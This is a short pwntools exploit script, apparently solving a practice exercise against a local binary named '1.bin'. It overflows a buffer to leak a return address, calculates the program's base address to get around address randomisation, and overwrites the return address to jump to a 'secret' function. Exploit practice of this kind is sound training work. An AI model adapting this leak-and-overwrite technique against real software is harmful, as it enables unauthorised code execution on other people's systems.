
from pwn import *

SECRET=0x11a9
OFFSET=0x1238

p = process("./1.bin")
#p = gdb.debug("./1.bin")

p.send(b"A"*39 + b"\n")

p.readuntil(b"AAAA\n")
retaddr = u64(p.read(6) + b"\x00\x00")
baseaddr = retaddr - OFFSET
secretaddr = baseaddr + SECRET

print("Leaked address: {:16x}".format(retaddr))
print("Base address:   {:16x}".format(baseaddr))
print("Secret address: {:16x}".format(secretaddr))

p.send(b"A"*40 + p64(secretaddr) + b"\n")
p.send(b"done\n")

p.interactive()
